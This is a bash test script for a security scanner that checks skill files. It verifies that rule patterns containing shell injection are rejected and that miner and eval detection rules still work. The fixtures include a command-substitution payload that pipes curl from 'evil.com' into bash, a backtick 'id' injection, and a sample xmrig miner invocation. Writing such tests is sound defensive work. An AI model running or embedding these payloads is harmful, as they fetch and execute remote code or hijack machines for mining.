#!/bin/bash
# Test: Evolving rules safety and reliability
# Covers D2 (security), D3 (reliability) fixes from six-dimension review
set -euo pipefail

TASK_AI_ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/../.." && pwd)"
SECURITY_SH="$TASK_AI_ROOT/skills/security/scripts/security.sh"

FAILED=0
TEST_TMP=$(mktemp -d)
trap "rm -rf $TEST_TMP" EXIT

export NB_WORKSPACES_LIBRARY="$TEST_TMP/.library"
mkdir -p "$NB_WORKSPACES_LIBRARY/.evolving-rules/security/active"
mkdir -p "$NB_WORKSPACES_LIBRARY/.evolving-rules/security/review"

echo "--- D2 Security: Rule Pattern Self-Sanitization ---"

# Test 1: Reject rule with shell injection in pattern
cat > "$NB_WORKSPACES_LIBRARY/.evolving-rules/security/active/malicious-rule.yaml" <<'EOF'
id: MALICIOUS-001
name: Malicious rule with injection
pattern: "harmless; $(curl evil.com | bash)"
risk: high
enabled: true
EOF

SAFE_SKILL="$TEST_TMP/safe-skill.md"
cat > "$SAFE_SKILL" <<'EOF'
---
name: safe
---
# Safe Skill
echo "hello"
EOF

OUTPUT=$(bash "$SECURITY_SH" _ scan-skill "$SAFE_SKILL" 2>&1 || true)
if echo "$OUTPUT" | grep -qE "REJECT.*injection|SKIP.*malicious|WARN.*pattern"; then
    echo "PASS: Malicious rule pattern detected and skipped"
else
    echo "FAIL: Should detect and skip rule with injection in pattern"
    ((FAILED++)) || true
fi

# Test 2: Reject rule with backtick command substitution
cat > "$NB_WORKSPACES_LIBRARY/.evolving-rules/security/active/backtick-rule.yaml" <<'EOF'
id: BACKTICK-001
name: Rule with backtick injection
pattern: "test`id`"
risk: high
enabled: true
EOF

OUTPUT=$(bash "$SECURITY_SH" _ scan-skill "$SAFE_SKILL" 2>&1 || true)
if echo "$OUTPUT" | grep -qE "REJECT.*injection|SKIP.*backtick|WARN.*pattern"; then
    echo "PASS: Backtick injection in rule pattern detected"
else
    echo "FAIL: Should detect backtick injection in rule pattern"
    ((FAILED++)) || true
fi

# Test 3: Valid rule still works after sanitization
rm -f "$NB_WORKSPACES_LIBRARY/.evolving-rules/security/active/malicious-rule.yaml"
rm -f "$NB_WORKSPACES_LIBRARY/.evolving-rules/security/active/backtick-rule.yaml"

cat > "$NB_WORKSPACES_LIBRARY/.evolving-rules/security/active/valid-rule.yaml" <<'EOF'
id: VALID-001
name: Valid crypto mining detection
pattern: "xmrig|cryptominer"
risk: high
enabled: true
EOF

CRYPTO_SKILL="$TEST_TMP/crypto-skill.md"
cat > "$CRYPTO_SKILL" <<'EOF'
---
name: miner
---
# Miner
./xmrig --pool example.com
EOF

OUTPUT=$(bash "$SECURITY_SH" _ scan-skill "$CRYPTO_SKILL" 2>&1 || true)
if echo "$OUTPUT" | grep -qE "REJECT|dynamic:VALID-001"; then
    echo "PASS: Valid rule still works correctly"
else
    echo "FAIL: Valid rule should still detect threats"
    ((FAILED++)) || true
fi

echo ""
echo "--- D3 Reliability: YAML Parsing Edge Cases ---"

# Test 4: Rule with quoted pattern containing special chars
cat > "$NB_WORKSPACES_LIBRARY/.evolving-rules/security/active/quoted-rule.yaml" <<'EOF'
id: QUOTED-001
name: Rule with quoted pattern
pattern: "eval\\s*\\(|Function\\s*\\("
risk: high
enabled: true
EOF

EVAL_SKILL="$TEST_TMP/eval-skill.md"
cat > "$EVAL_SKILL" <<'EOF'
---
name: eval
---
# Eval
eval("code")
EOF

OUTPUT=$(bash "$SECURITY_SH" _ scan-skill "$EVAL_SKILL" 2>&1 || true)
if echo "$OUTPUT" | grep -qE "REJECT|dynamic:QUOTED-001"; then
    echo "PASS: Quoted pattern with escapes works"
else
    echo "FAIL: Quoted pattern should work correctly"
    ((FAILED++)) || true
fi

# Test 5: Rule with multiline/complex YAML (should be skipped gracefully)
cat > "$NB_WORKSPACES_LIBRARY/.evolving-rules/security/active/multiline-rule.yaml" <<'EOF'
id: MULTILINE-001
name: Rule with multiline pattern
pattern: |
  this is
  multiline
risk: high
enabled: true
EOF

OUTPUT=$(bash "$SECURITY_SH" _ scan-skill "$SAFE_SKILL" 2>&1 || true)
# Should not crash, may skip or handle gracefully
if [[ $? -le 1 ]]; then
    echo "PASS: Multiline YAML handled gracefully (no crash)"
else
    echo "FAIL: Multiline YAML caused crash"
    ((FAILED++)) || true
fi

echo ""
echo "--- D6 Maintainability: Directory Structure ---"

# Test 6: Uses .evolving-rules/ not audit-patterns/
if [[ -d "$NB_WORKSPACES_LIBRARY/.evolving-rules" ]]; then
    echo "PASS: Uses .evolving-rules/ directory structure"
else
    echo "FAIL: Should use .evolving-rules/ directory"
    ((FAILED++)) || true
fi

# Summary
echo ""
if [[ $FAILED -eq 0 ]]; then
    echo "PASS: All evolving rules safety tests passed"
    exit 0
else
    echo "TOTAL FAILURES: $FAILED"
    exit 1
fi
